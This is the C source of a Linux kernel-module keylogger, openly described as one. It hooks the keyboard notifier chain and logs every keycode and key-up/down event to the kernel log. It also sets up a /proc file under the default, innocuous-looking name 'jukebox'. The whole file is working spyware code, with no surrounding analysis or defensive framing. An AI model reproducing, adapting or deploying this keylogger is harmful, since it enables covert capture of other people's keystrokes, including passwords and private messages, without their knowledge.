/* klogger.c -  Basic Implementation of a keylogger at kernel space */
#include <linux/moduleparam.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <asm/uaccess.h>
#include "klogger.h"


#define PROCFS_MAX_SIZE 1024

/* Module's input parameters */
static char *procfs_name = "jukebox";

module_param(procfs_name, charp, 0000);
MODULE_PARM_DESC(procfs_name, " Define a different name for your proc file. By default, it is jukebox.");


/* This structure hold information about the /proc file */
static struct proc_dir_entry *proc_file_entry;

/* The buffer used to store character for this module */
static char procfs_buffer[PROCFS_MAX_SIZE];

/* The size of the buffer */
static unsigned long procfs_buffer_size = 0;

/** 
 * Handler responsable to read and log every key pressed by the user
 *
 */
int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param) {

  printk(KERN_INFO "someone is writing...");
  struct keyboard_notifier_param *param = _param;
  struct vc_data *vc = param->vc;

  if (code == KBD_KEYCODE) {
    printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
  }

  return NOTIFY_OK;
}


/* declare keyboard_listener as the handler of keyboard events */
static struct notifier_block nb = {
  .notifier_call = keyboard_listener
};

/**
 * This function is called when the module is loaded
 *
 */
int init_procfs_file()
{
        /* create the /proc file */
        proc_file_entry = create_proc_entry(procfs_name, 0644, NULL);

        if (proc_file_entry == NULL) {
                remove_proc_entry(procfs_name, NULL);
                printk(KERN_ALERT "Error: Could not initialize /proc/%s\n",
                        procfs_name);
                return -ENOMEM;
        }

        proc_file_entry->read_proc  = read_procfs_file;
        proc_file_entry->write_proc = write_procfs_file;
        proc_file_entry->mode     = S_IFREG | S_IRUGO;
        proc_file_entry->uid      = 0;
        proc_file_entry->gid      = 0;
        proc_file_entry->size     = 37;

        printk(KERN_INFO "/proc/%s created\n", procfs_name);
        return 0;       /* everything is ok */
}

/**
 * This function is called when the module is unloaded
 *
 */
void clear_procfs_file()
{
        remove_proc_entry(procfs_name, NULL);
        printk(KERN_INFO "/proc/%s removed\n", procfs_name);
}


/**
 * This function is called then the /proc file is read
 *
 */
int read_procfs_file(char *buffer,
              char **buffer_location,
              off_t offset, int buffer_length, int *eof, void *data)
{
        int ret;

        printk(KERN_INFO "procfile_read (/proc/%s) called\n", procfs_name);

        if (offset > 0) {
                /* we have finished to read, return 0 */
                ret  = 0;
        } else {
                /* fill the buffer, return the buffer size */
                memcpy(buffer, procfs_buffer, procfs_buffer_size);
                ret = procfs_buffer_size;
        }

        return ret;
}


/**
 * This function is called with the /proc file is written
 *
 */

int write_procfs_file(struct file *file, const char *buffer, unsigned long count,
                   void *data)
{
        /* get buffer size */
        procfs_buffer_size = count;

        if (procfs_buffer_size > PROCFS_MAX_SIZE ) {
                procfs_buffer_size = PROCFS_MAX_SIZE;
        }

        /* write data to the buffer */
        if ( copy_from_user(procfs_buffer, buffer, procfs_buffer_size) ) {
                return -EFAULT;
        }

        return procfs_buffer_size;
}


static int __init klogger_init(void)
{
  init_procfs_file();
  register_keyboard_notifier(&nb);
  printk(KERN_INFO "klogger registered and listening");

  return 0;
}

static void __exit klogger_exit(void)
{
  clear_procfs_file();
  unregister_keyboard_notifier(&nb);
  printk(KERN_INFO "klogger unregistered");
}


module_init(klogger_init);
module_exit(klogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Carlos Andre");
MODULE_DESCRIPTION("A basic keylogger implemention.");
